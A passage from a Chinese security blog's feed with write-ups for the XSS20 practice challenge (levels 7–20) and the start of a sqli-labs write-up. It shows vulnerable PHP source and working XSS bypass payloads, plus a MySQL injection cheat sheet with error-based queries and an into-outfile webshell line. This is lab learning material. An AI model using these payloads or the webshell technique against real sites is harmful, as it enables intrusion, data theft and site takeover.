value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里面把我们输入的所有字符全部替换成小写，并且把这些标签名都替换为了空。但是这属于黑名单模式，我们直接双写绕一下就好。</p><p><code>&quot;&gt;&lt;a hrHREFef=&quot;javasSCRIPTcript:alert(&#39;xss&#39;)&quot;&gt;bobosec&lt;/a&gt;&quot;</code></p><p><img src="/2019/03/01/XSS20-Write-up/less7.jpg" alt=" "></p><p>可以看到对比效果</p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less 8"></a>Less 8</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个代码绕过就有点麻烦了，所以我们在添加友情链接那里想办法，友情链接只是转义了script所以我们采用别的编码即可如下：</p><p><code>java&amp;#x73;cript:alert()</code>java没被过滤所以不用转义，剩下的字母随便转义一个就好，这里有<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">网站</a>可以在线编码。</p><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less 9"></a>Less 9</h2><p>这关页面和上一关看着差不多，我们试一下上一关payload，发现会提示链接不合法，看一下源码~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大部分是一样的，只不过在友情链接哪里多了一个判断<code>if(false===strpos($str7,&#39;http://&#39;))</code>这说明链接必须要有<code>http://</code>，strpos()作用是查找 “http://“ 在$srt7中第一次出现的位置，所以我们在上一关基础上改一下就好：</p><p><code>java&amp;#x73;cript:alert()/*http://www.bobosec.top*/</code></p><p>这里需要把我们的网站注释一下，如果不注释他会一直访问，但是访问不到，所以只要让他检测到有<code>http://</code>就好.</p><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less 10"></a>Less 10</h2><p>第十关试了半天也不知道咋回事。。。所以直接看源码了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原来如此，这里面需要有两个参数：<code>keyword和t_sort</code>但是后面没有用到keyword这个参数的地方，他把我们输入的<code>&lt;</code>和<code>&gt;</code>也全部替换为空了，所以标签基本都废了。但是下面有三个隐藏参数，需要get好几个选项，所以要用&amp;连接。我们把类型改为text。</p><p><code>abc&amp;bobosec&amp;t_sort=&quot;onclick=&quot;alert()&quot;type=&quot;text&quot;</code></p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less 11"></a>Less 11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​    这一关多了HTTP_REFERER这是来自上一关的referer，所以要开始抓包改referer了</p><p>直接改referer就ok，如图：</p><p><img src="/2019/03/01/XSS20-Write-up/less11.1.jpg" alt=" "></p><p><img src="/2019/03/01/XSS20-Write-up/less11.2.jpg" alt=" "></p><p><code>abc&amp;bobosec&amp;t_sort=&quot;onclick=&quot;alert()&quot;type=&quot;text&quot;</code></p><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less 12"></a>Less 12</h2><p>后面难度越来越大，我们直接边看源码边分析吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这次要的不是referer了，变成user_agent了，还是抓包发送就好</p><p><img src="/2019/03/01/XSS20-Write-up/less12.jpg" alt=" "></p><p>在十一关成功的时候抓包，点确定，然后改user_agent为<code>abc&amp;bobosec&amp;t_sort=&quot;onclick=&quot;alert()&quot;type=&quot;text&quot;</code></p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less 13"></a>Less 13</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一关多了个cookies，所以我们直接抓包修改cookies即可，把cookies改成<code>abc&amp;bobosec&amp;t_sort=&quot;onclick=&quot;alert()&quot;type=&quot;text&quot;</code>就好了，和前几关一样的</p><h2 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level14<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level14<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"leftframe"</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">"http://www.exifviewer.org/"</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xsschallenge/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>点我进level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这一关看着有点迷，源码里内嵌了一个iframe：<a href="http://www.exifviewer.org/" target="_blank" rel="noopener">http://www.exifviewer.org/</a></p><p>可是这个网站一直打不开，看了一下别的人WP说是要构造一个XSS图片，这里用到的工具是exiftools，有兴趣的dalao们可以试一下~，这是乌云2012年爆出来的DiscuzX2个人空间图片exif信息XSS。我们直接进Less 15</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less 15"></a>Less 15</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里在最后php代码里可以看到一个ng-include文件包含，那么我就可以尝试让他包含某个可以执行xss漏洞的文件，然后让这个文件调用alert方法就可以了。</p><h3 id="ng-include"><a href="#ng-include" class="headerlink" title="ng-include"></a>ng-include</h3><ol><li><p>ng-include指令用于包含外部的 HTML 文件。</p></li><li><p>包含的内容将作为指定元素的子节点。</p></li><li><p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p></li><li><p>默认情况下，包含的文件需要包含在同一个域名下。</p></li></ol><p>这个只需要包含一个可以执行XSS的漏洞文件就可以，现成的就是第一关的，直接包含就好~</p><p><code>&#39;level1.php?name=bobosec&lt;img src=111 onerror=alert(1)&gt;&#39;</code></p><p>第十五关后面链接不对，应该是<code>http://localhost/XSS20/level15.php?src==1.gif</code></p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less 16"></a>Less 16</h2><p>终于来到个正常的关了。。14和15都好迷~</p><p>贴代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以看到在这里新增过滤了空格，所以现在是<code>script ,空格 ,/,都转义了</code></p><p>绕过可以看一下HTML URL编码，参考这个文章：<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">http://www.w3school.com.cn/tags/html_ref_urlencode.html</a></p><p><code>bobosec%3Cimg%0dsrc=1%0donerror=alert(1)%3E</code></p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less 17"></a>Less 17</h2><p>点击摄像机会弹出flash动画，捣鼓了好久发现没用啊、、只好看源码了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>有<code>&lt;embed&gt;</code>标签定义嵌入的内容，所以我们可以直接插入插件</p><p>发现这个和那个flash动画一点关系也没有、、、真的坑</p><p>这里直接给arg01和arg02随意赋值，让他写入到<code>&lt;embed&gt;</code>里<code>arg01=a&amp;arg02=bobosec%20onmouseenter=alert()</code></p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less 18"></a>Less 18</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>感觉和上一关一样啊、、所以用上一关payload也过去了</p><h2 id="Less-19-amp-Less-20"><a href="#Less-19-amp-Less-20" class="headerlink" title="Less 19&amp;Less 20"></a>Less 19&amp;Less 20</h2><p>全是flash的xss。。小白的我真的不会了，有大佬会的求教~orz</p>]]></content>
    
    <summary type="html">
    
      XSS20 学习
    
    </summary>
    
      <category term="学习记录" scheme="http://bobosec.top/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="日益成长的小白" scheme="http://bobosec.top/tags/%E6%97%A5%E7%9B%8A%E6%88%90%E9%95%BF%E7%9A%84%E5%B0%8F%E7%99%BD/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs</title>
    <link href="http://bobosec.top/2019/02/26/sqli-labs/"/>
    <id>http://bobosec.top/2019/02/26/sqli-labs/</id>
    <published>2019-02-26T12:28:14.000Z</published>
    <updated>2019-02-28T13:35:17.425Z</updated>
    
    <content type="html"><![CDATA[<p>开始撸一波sqli-labs，加油~</p><h1 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h1><p>这里参考一下IV4N大佬的博客，整理的超级棒</p><h3 id="SCHEMATA表"><a href="#SCHEMATA表" class="headerlink" title="SCHEMATA表"></a><strong>SCHEMATA表</strong></h3><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</p><h3 id="TABLES表"><a href="#TABLES表" class="headerlink" title="TABLES表"></a><strong>TABLES表</strong></h3><p>储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表</p><h3 id="COLUMNS表"><a href="#COLUMNS表" class="headerlink" title="COLUMNS表"></a><strong>COLUMNS表</strong></h3><p>提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show  columns from schemaname.tablename的结果取之此表</p><p>version()——MySQL 版本</p><p>user()——数据库用户名</p><p>current_user——当前用户名</p><p>database()——数据库名</p><p>@@datadir——数据库路径</p><p>@@version_compile_os——操作系统版本</p><p>into outfile——写入文件，<code>select &#39;一句话木马&#39; into outfile &quot;/var/www/html/test.php&quot;</code></p><p>数据库插入语句：<code>insert into [table] values(a,b,c);</code></p><p>删除语句：<code>delete from [table] where id=1;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database [datebase];`，`drop table [table];`，`alter table [table] drop column [column];</span><br></pre></td></tr></table></figure><p>修改：<code>update [table] set [column] = &#39;abc&#39; where id =1;</code></p><p>concat(str1,str2,…)——无分隔符地连接字符串</p><p>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p><p>group_concat(group SEPARATOR ‘;’ )——连接一组字符串，后可加GROUP BY</p><p>extractvalue() 从xml中提取数据</p><p><strong>盲注</strong></p><p>length()</p><p>mid(str,n,m) 从str的第n个数开始提取m个 //与vb的mid()函数相同</p><p>substr(str,n,m) 从str的第n个数开始提取m个</p><p>left(str,n) 从左开始提取n个 //与vb的left()函数相同</p><p>ord() 字符=&gt;ascii //与python的ord()函数相同</p><p>ascii() 同ord()</p><p><strong>Time-Based</strong></p><p>BENCHMARK(count,func())</p><p>sleep()</p><p>if(a,t,f) //同a?t:f</p><p><strong>Wrong-Based</strong></p><p>使用group by对rand()函数操作时会返回duplicate key error</p><p>rand(int) //以int为种子生成伪随机数</p><p>floor() //向下取整</p><p>count() //统计个数</p><ul><li>and extractvalue(1, concat(0x25, (select table_name from information_schema.tables limit 1)));</li><li>and 1=(updatexml(1,concat(0x25,(select user())),1))</li><li>and(select 1 from(select count(<em>),concat((select (select (select concat(0x25,(select username from users where id=1),0x25))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)#</li><li>and select <em> from(select </em> from table a join table b)as c</li></ul><p><strong>正则注入</strong></p><p>Mysql中的RE和大多数编程语言中的相同，不赘述</p><p><code>select user() regexp &#39;^[a-z]&#39;</code> 正确时返回1，错误返回0</p><p><code>select * from * where id =1 and 1=(user() regexp &#39;^[a-z]{4}&#39;)</code> </p><p>regexp可替换为like</p><p><strong>操作文件</strong></p><p><code>and (select count(*) from mysql.user)&gt;0</code> //返回正常说明有读取权限</p><p><code>select * INTO OUTFILE &#39;file_name&#39;</code> //写入文件，文件不能存在</p><p>爆数据库 <code>select schema_name from information_schema.schemata</code></p><p>爆某库的数据表 <code>select table_name from information_schema.tables where table_schema=’xxxxx’</code></p><p>爆某表的所有列 <code>select column_name from information_schema.columns where table_name=’xxxxx’</code></p><p>获取某列的内容 <code>select xx_column from xx_table</code></p><p>列出所有的数据库 <code>select group_concat(schema_name) from information_schema.schemata</code></p><p>列出某个库当中所有的表 <code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;xxxxx&#39;</code></p><p>系统数据库——information_schema，包含所有数据库相关信息</p><p>information_schema.schemata中schema_name列，字段为所有库名</p><p>information_schema.tables中table_name列对应数据库所有表名，与table_schema列对应</p><p>information_schema.columns同理，column_name与table_schema和table_name对应</p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less 1"></a>Less 1</h2><p>这一关先测试一下属于字符型注入</p><p><code>?id=1&#39;and &#39;1&#39;=&#39;1</code>回显正常，<code>?id=1&#39;and &#39;1&#39;=&#39;2</code>报错，确定是字符型注入。</p><p>使用order by排序试得有3行。继续用联合注入<code>union select 1,2,3--+</code>发现在2和3位置有回显，所以要在2，3两个位置注入和查询。</p><p>先查数据库和数据库版本<code>?id=-1&#39;union select 1,database(),version()--+</code>发现显示出来了当前数据库和版本。</p><p> 